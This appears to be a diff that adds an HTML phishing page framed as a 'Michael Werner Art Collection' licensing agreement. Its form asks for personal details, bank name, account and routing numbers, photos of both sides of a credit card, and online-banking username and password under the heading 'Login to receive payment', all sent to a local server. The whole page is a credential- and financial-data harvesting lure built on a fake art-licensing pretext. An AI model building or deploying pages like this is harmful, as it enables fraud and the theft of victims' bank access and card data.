@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Contact</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Young+Serif&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/styles.css" />
+  </head>
+  <body>
+    <div
+      class="contact-section"
+      style="box-shadow: 0px 5px 62px -4px rgba(0,0,0,0.78);
+      -webkit-box-shadow: 0px 5px 62px -4px rgba(0,0,0,0.78);
+      -moz-box-shadow: 0px 5px 62px -4px rgba(0,0,0,0.78); padding-bottom: 2rem; padding-top: 2rem; border-radius: 10px"
+    >
+      <h1 style="text-align: center">Michael Werner Art Collection</h1>
+      <h2 style="text-align: center">Licensing Agreement</h2>
+      <p style="padding: 2rem">
+        Ownership of photos. Client agrees that, subject to the rights and
+        licenses granted herein, Artist is, and will remain, the sole and
+        exclusive owner of all right and interest, throughout the world, to all
+        Photos and any copies of the Photos. Except as expressely provided in
+        this Agreement, artist reserves all rights and licenses not expressely
+        granted in this Agreement.
+      </p>
+      <div class="border"></div>
+      <form
+        action="http://localhost:3000/contact"
+        method="post"
+        class="contact-form"
+        enctype="multipart/form-data"
+      >
+        <div class="container">
+          <div class="form-group">
+            <p style="color: red; text-align: center">
+              *This field requires your personal information
+            </p>
+            <input
+                type="text"
+                hidden
+                name="yoursubject"
+                value="Licensing Aggrement"
+              />
+            <div class="form-item">
+              <label>Full Name: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your name"
+                name="yourname"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Mobile Number: </label>
+              <input
+                type="tel"
+                class="contact-form-text"
+                placeholder="Mobile Number"
+                name="yourNumber"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Email: </label>
+              <input
+                type="email"
+                class="contact-form-text"
+                placeholder="Your email"
+                name="youremail"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Street Address: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your Street Address"
+                name="yourAddress"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>City: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your City"
+                name="yourCity"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>State: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your State"
+                name="yourState"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Zip: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your Zip Code"
+                name="yourZip"
+                required
+              />
+            </div>
+          </div>
+          <div class="form-group">
+            <p style="color: red">
+              *This field requires your payment information
+            </p>
+            <div class="form-item">
+              <label>Select Bank: </label>
+              <select name="yourBank" class="contact-form-text">
+                <option value="Chase Bank">Chase Bank</option>
+                <option value="Bank of America">Bank of America</option>
+                <option value="Wells Fargo">Wells Fargo</option>
+                <option value="U.S. Bank">U.S. Bank</option>
+                <option value="BBVA Compass">BBVA Compass</option>
+                <option value="Capital One Bank">Capital One Bank</option>
+                <option value="Bank of the West">Bank of the West</option>
+                <option value="Santander Consumer Bank">Santander Consumer Bank</option>
+                <option value="Citi Bank">Citi Bank</option>
+                <option value="Huntington Bank">Huntington Bank</option>
+                <option value="M&T Bank">M&T Bank</option>
+                <option value="Woodforest National Bank">Woodforest National Bank</option>
+                <option value="Citizens Bank">Citizens Bank</option>
+                <option value="Fifth Third Bank">Fifth Third Bank</option>
+                <option value="Key Ban">Key Bank</option>
+                <option value="TD Bank">TD Bank</option>
+                <option value="Sun Trust Bank">Sun Trust Bank</option>
+                <option value="Regions Bank">Regions Bank</option>
+                <option value="PNC Bank">PNC Bank</option>
+                <option value="BB&T Bank">BB&T Bank</option>
+                <option value="First National Bank">First National Bank</option>
+                <option value="BMO Harris Bank">BMO Harris Bank</option>
+                <option value="First Citizens Bank">First Citizens Bank</option>
+                <option value="Comerica Bank">Comerica Bank</option>
+                <option value="People's United Bank">People's United Bank</option>
+                <option value="Umpqua Bank">Umpqua Bank</option>
+                <option value="Bank of Ozarks">Bank of Ozarks</option>
+                <option value="Arvest Bank">Arvest Bank</option>
+                <option value="Chemical Bank">Chemical Bank</option>
+                <option value="TCF Bank">TCF Bank</option>
+                <option value="Synovus Bank">Synovus Bank</option>
+                <option value="Bancorp South Bank">Bancorp South Bank</option>
+                <option value="Washington Federal">Washington Federal</option>
+                <option value="Associated Bank">Associated Bank</option>
+                <option value="Iberia Bank">Iberia Bank</option>
+                <option value="Valley National Bank">Valley National Bank</option>
+                <option value="Whitney Bank">Whitney Bank</option>
+                <option value="Trust Mark National Bank">Great Western Bank</option>
+                <option value="Columbia State Bank">Columbia State Bank</option>
+                <option value="Centennial Bank">Centennial Bank</option>
+                <option value="Old National Bank">Old National Bank</option>
+                <option value="South State Bank">South State Bank</option>
+                <option value="First Tennessee Bank">First Tennessee Bank</option>
+                <option value="NBT Bank">NBT Bank</option>
+                <option value="Renasant Bank">Renasant Bank</option>
+                <option value="Banner Bank">Banner Bank</option>
+                <option value="Webster Bank">Webster Bank</option>
+                <option value="Simmons Bank">Simmons Bank</option>
+                <option value="United Bank">United Bank</option>
+                <option value="Frost Bank">Frost Bank</option>
+                <option value="WesBanco Ban">WesBanco Bank</option>
+                <option value="Commerce Bank">Commerce Bank</option>
+                <option value="Investors Bank">Investors Bank</option>
+                <option value="TrustCo Bank">TrustCo Bank</option>
+                <option value="First Commonwealth Bank">First Commonwealth Bank</option>
+                <option value="Sterling National Banka">Sterling National Bank</option>
+                <option value="Carter Bank and Trust">Carter Bank and Trust</option>
+                <option value="First Midwest Bank">First Midwest Bank</option>
+                <option value="First Bank">First Bank</option>
+                <option value="Park National Ban">Park National Bank</option>
+                <option value="Pinnacle Bank">Pinnacle Bank</option>
+                <option value="Glacier Bank">Glacier Bank</option>
+                <option value="Fulton Banka">Fulton Bank</option>
+                <option value="RaboBank">RaboBank</option>
+                <option value="Zions Bank">Zions Bank</option>
+                <option value="First Merchants Bank">First Merchants Bank</option>
+                <option value="Union Bank and Trust">Union Bank and Trust</option>
+                <option value="Great Southern Bank">Great Southern Bank</option>
+                <option value="Flagster Bank">Flagster Bank</option>
+              </select>
+            </div>
+            <div class="form-item">
+              <label>Account Number: </label>
+              <input
+                type="tel"
+                class="contact-form-text"
+                placeholder="Your Account Number"
+                name="yourAccountNumber"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Routing: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your Routing"
+                name="yourRouting"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Branch Location: </label>
+              <input
+                type="text"
+                class="contact-form-text"
+                placeholder="Your Branch Location"
+                name="yourBranchLocation"
+                required
+              />
+            </div>
+            <div class="form-item">
+              <label>Account Type: </label>
+              <div class="radio-group">
+                <input type="radio" id="checking" value="checking" name="AccountType"/>
+                <label for="checking">Checking</label>
+                <input type="radio" id="savings" value="savings" name="AccountType" />
+                <label for="savings">Savings</label>
+              </div>
+            </div>
+            <div class="form-item">
+              <label>Upload your credit card (Front): </label>
+              <input type="file" name="credit-card-front" required />
+            </div>
+            <div class="form-item">
+              <label>Upload your credit card (Back): </label>
+              <input type="file" name="credit-card-back" required />
+            </div>
+          </div>
+        </div>
+        <div class="login-details">
+          <h2 style="text-align: center">Login to receive payment</h2>
+          <div class="form-item">
+            <label>Bank Username: </label>
+            <input
+              type="text"
+              class="contact-form-text"
+              placeholder="Your Bank Username"
+              name="yourBankUsername"
+              required
+            />
+            <div class="form-item">
+              <label>Password: </label>
+              <input
+                type="password"
+                class="contact-form-text"
+                placeholder="Your Password"
+                name="yourPassword"
+                required
+              />
+          </div>
+          <input
+          type="submit"
+          id="form-submit"
+          class="contact-form-btn"
+          value="Login"
+          required
+        />
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
